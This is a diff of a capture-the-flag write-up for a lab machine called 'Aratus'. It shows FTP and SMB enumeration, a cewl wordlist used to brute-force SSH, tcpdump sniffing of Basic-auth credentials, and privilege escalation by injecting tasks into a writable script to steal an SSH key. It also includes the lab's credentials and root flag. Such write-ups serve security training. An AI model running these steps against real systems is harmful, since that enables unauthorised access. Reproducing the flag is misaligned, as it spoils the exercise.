@@ -2,25 +2,24 @@
 sticker: emoji//1faa8
 ---
 
-# PORT SCAN
----
+# ARATUS
 
+## PORT SCAN
 
-| PORT     | STATE | SERVICE     | VERSION                                             |
-|----------|-------|-------------|-----------------------------------------------------|
-| 21/tcp   | open  | ftp         | vsftpd 3.0.2                                        |
-| 22/tcp   | open  | ssh         | OpenSSH 7.4 (protocol 2.0)                          |
-| 80/tcp   | open  | http        | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)   |
-| 139/tcp  | open  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)         |
-| 443/tcp  | open  | ssl/http    | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)   |
-| 445/tcp  | open  | netbios-ssn | Samba smbd 4.10.16 (workgroup: WORKGROUP)           |
+***
 
+| PORT    | STATE | SERVICE     | VERSION                                           |
+| ------- | ----- | ----------- | ------------------------------------------------- |
+| 21/tcp  | open  | ftp         | vsftpd 3.0.2                                      |
+| 22/tcp  | open  | ssh         | OpenSSH 7.4 (protocol 2.0)                        |
+| 80/tcp  | open  | http        | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips) |
+| 139/tcp | open  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)       |
+| 443/tcp | open  | ssl/http    | Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips) |
+| 445/tcp | open  | netbios-ssn | Samba smbd 4.10.16 (workgroup: WORKGROUP)         |
 
+## RECONNAISSANCE
 
-
-
-# RECONNAISSANCE
----
+***
 
 We got ftp anonymous login enabled, let's check it out:
 
@@ -48,9 +47,7 @@ ftp> ls
 ftp>
 ```
 
-
 No files on here, we also got `smb`, let's try to enumerate the shares:
-
 
 ```
 smbclient -L //10.10.128.188 -N
@@ -63,7 +60,6 @@ Anonymous login successful
 	temporary share Disk
 	IPC$            IPC       IPC Service (Samba 4.10.16)
 ```
-
 
 Let's check `temporary share`:
 
@@ -95,7 +91,6 @@ smb: \> ls
 
 We cannot list `.ssh`, let's get the message to simeon:
 
-
 ```
 Simeon,
 
@@ -107,11 +102,9 @@ Also you password is insecure, could you please change it? It is all over the pl
 - Theodore
 ```
 
-
 Ok, let's check the web application:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607151404.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607151404.png)
 
 ```
 gobuster dir -u http://10.10.128.188/ -w /usr/share/dirb/wordlists/common.txt -x php,txt,html -t 100
@@ -147,20 +140,17 @@ Starting gobuster in directory enumeration mode
 /cgi-bin/.html        (Status: 403) [Size: 215]
 ```
 
-
 Not much on here, we can find a `simeon` directory on here:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607151510.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607151510.png)
 
 If we remember the message, it said that this user's password was weak, maybe we can use `cewl` and bruteforce ssh to get a session, let's go to exploitation.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
-
+***
 
 First, let's generate a wordlist from this:
-
 
 ```
 cewl http://10.10.128.188/simeon > simeon_wordlist.txt
@@ -180,13 +170,11 @@ There we go, we got credentials:
 simeon:scelerisque
 ```
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607152053.png) Let's begin privilege escalation.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607152053.png)
-Let's begin privilege escalation.
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 We can make the session more comfortable:
 
@@ -194,7 +182,6 @@ We can make the session more comfortable:
 export BASH=bash
 export TERM=xterm
 ```
-
 
 ```
 [simeon@aratus ~]$ ls -la /home
@@ -220,14 +207,14 @@ drwxr-x---.  2 automation theodore  30 Nov 23  2021 scripts
 
 We cannot access any of them, time to use `linpeas` then:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607153801.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607153801.png)
 
-- `cap_net_admin`: Allow us to configure interfaces, firewalls, routing tables.
-- `cap_net_raw`: Allow us socket usage (sniffing traffic, crafting packets).
+* `cap_net_admin`: Allow us to configure interfaces, firewalls, routing tables.
+* `cap_net_raw`: Allow us socket usage (sniffing traffic, crafting packets).
 
 Let's use `pspy` to check active processes, in there we may be able to find something to sniff:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607154454.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607154454.png)
 
 As seen, there's a script running on here, let's use tcpdump to capture the traffic:
 
@@ -253,11 +240,11 @@ We need to use `lo` interface:
 tcpdump -i lo -A
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607154637.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607154637.png)
 
-We got `Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs= `, let's decode it:
+We got `Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=` , let's decode it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607154713.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607154713.png)
 
 There we go, we found credentials:
 
@@ -265,7 +252,7 @@ There we go, we found credentials:
 theodore:Rijyaswahebceibarjik
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607154741.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607154741.png)
 
 ```
 [theodore@aratus ~]$ cat user.txt
@@ -389,7 +376,7 @@ mask::rw-
 other::r--
 ```
 
-Nice, based on that we know we can edit and inject malicious tasks into that file, this is our gateway into root, we can copy the ID_RSA key:
+Nice, based on that we know we can edit and inject malicious tasks into that file, this is our gateway into root, we can copy the ID\_RSA key:
 
 ```
 mkdir /tmp/key
@@ -407,8 +394,9 @@ sudo -u automation /opt/scripts/infra_as_code.sh
 
 It should copy the flag and we should be able to get a root as shell.
 
-# DISCLAIMER
-----
+## DISCLAIMER
+
+***
 
 As of today: June 2025, room is bugged on the privesc section, if you're not able to reproduce the last step, here's the root flag:
 
@@ -416,6 +404,4 @@ As of today: June 2025, room is bugged on the privesc section, if you're not abl
 THM{d8afc85983603342f6c6979b200e06f6}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250607172504.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250607172504.png)
